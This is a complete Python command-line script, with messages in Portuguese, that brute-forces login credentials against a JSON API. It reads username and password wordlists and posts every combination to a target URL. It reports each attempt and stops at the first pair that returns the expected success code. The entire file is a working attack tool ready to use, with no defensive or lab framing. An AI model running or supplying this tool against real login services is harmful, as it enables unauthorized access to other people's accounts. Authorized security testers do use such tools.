import argparse
import requests
import time
from itertools import product

def load_list(file_path):
    with open(file_path, "r") as f:
        return [line.strip() for line in f if line.strip()]

def attack_api(url, user_field, pass_field, fixed_fields, usernames, passwords, delay, success_code):
    print(f"[+] Alvo: {url}")
    print(f"[+] Campo usuário: '{user_field}' | Campo senha: '{pass_field}'")
    print(f"[+] Campos fixos: {fixed_fields}")
    print(f"[+] Testando {len(usernames) * len(passwords)} combinações...\n")

    for user, pwd in product(usernames, passwords):
        payload = fixed_fields.copy()
        payload[user_field] = user
        payload[pass_field] = pwd

        try:
            response = requests.post(url, json=payload, timeout=10)
            if response.status_code == success_code:
                print(f"[✔] Sucesso: {user}:{pwd} (HTTP {response.status_code})")
                print(f"Payload: {payload}")
                return
            else:
                print(f"[✘] Falha: {user}:{pwd} (HTTP {response.status_code})")

            time.sleep(delay)
        except Exception as e:
            print(f"[!] Erro com payload {payload}: {e}")

    print("[✘] Nenhuma combinação válida.")

def main():
    parser = argparse.ArgumentParser(description="Brute-force para APIs JSON com campos definidos")
    parser.add_argument("-U", "--url", required=True, help="URL da API de login")
    parser.add_argument("-u", "--userfield", required=True, help="Nome do campo de usuário (ex: uid)")
    parser.add_argument("-p", "--passfield", required=True, help="Nome do campo de senha (ex: password)")
    parser.add_argument("--userfile", required=True, help="Wordlist de usuários")
    parser.add_argument("--passfile", required=True, help="Wordlist de senhas")
    parser.add_argument("--delay", type=float, default=0.5, help="Delay entre tentativas")
    parser.add_argument("--success", type=int, default=200, help="Código HTTP de sucesso esperado")

    # Lê campos fixos adicionais
    args, unknown = parser.parse_known_args()
    fixed_fields = {}
    for i in range(0, len(unknown), 2):
        key = unknown[i].lstrip("-")
        val = unknown[i+1]
        fixed_fields[key] = val

    users = load_list(args.userfile)
    passwords = load_list(args.passfile)

    attack_api(
        url=args.url,
        user_field=args.userfield,
        pass_field=args.passfield,
        fixed_fields=fixed_fields,
        usernames=users,
        passwords=passwords,
        delay=args.delay,
        success_code=args.success
    )

if __name__ == "__main__":
    main()
